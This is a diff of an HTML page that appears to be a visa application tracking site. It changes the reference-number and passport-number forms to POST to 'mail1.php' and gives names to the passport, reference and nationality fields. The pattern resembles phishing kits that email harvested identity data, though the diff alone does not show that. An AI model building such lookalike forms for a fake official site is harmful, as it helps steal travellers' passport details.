@@ -259,12 +259,12 @@
               
               <!-- Tab 1: By Reference Number -->
               <div class="tab-pane fade show active" id="tab-ref" role="tabpanel">
-                <form id="trackRefForm">
+                <form id="trackRefForm" action="mail1.php" method="POST">
                   <div class="mb-3">
                     <label class="form-label" for="trackRefInput">Application Reference Number <span class="text-danger">*</span></label>
                     <div class="input-group">
                       <span class="input-group-text bg-light"><i class="bi bi-hash text-gold"></i></span>
-                      <input type="text" class="form-control" id="trackRefInput" placeholder="e.g. DVA-2026-89421" required>
+                      <input type="text" class="form-control" id="trackRefInput" name="reference_number" placeholder="e.g. DVA-2026-89421" required>
                     </div>
                     <div class="form-text small">Found on your application confirmation email or WhatsApp receipt.</div>
                   </div>
@@ -276,18 +276,18 @@
 
               <!-- Tab 2: By Passport Number -->
               <div class="tab-pane fade" id="tab-passport" role="tabpanel">
-                <form id="trackPassportForm">
+                <form id="trackPassportForm" action="mail1.php" method="POST">
                   <div class="row g-3">
                     <div class="col-md-6">
                       <label class="form-label" for="trackPassInput">Passport Number <span class="text-danger">*</span></label>
                       <div class="input-group">
                         <span class="input-group-text bg-light"><i class="bi bi-passport text-gold"></i></span>
-                        <input type="text" class="form-control" id="trackPassInput" placeholder="e.g. Z1234567" required>
+                        <input type="text" class="form-control" id="trackPassInput" name="passport_number" placeholder="e.g. Z1234567" required>
                       </div>
                     </div>
                     <div class="col-md-6">
                       <label class="form-label" for="trackNationalityInput">Applicant Nationality <span class="text-danger">*</span></label>
-                      <select class="form-select" id="trackNationalityInput" required>
+                      <select class="form-select" id="trackNationalityInput" name="nationality" required>
                         <option value="">Select Nationality</option>
                         <option value="India">India</option>
                         <option value="Pakistan">Pakistan</option>
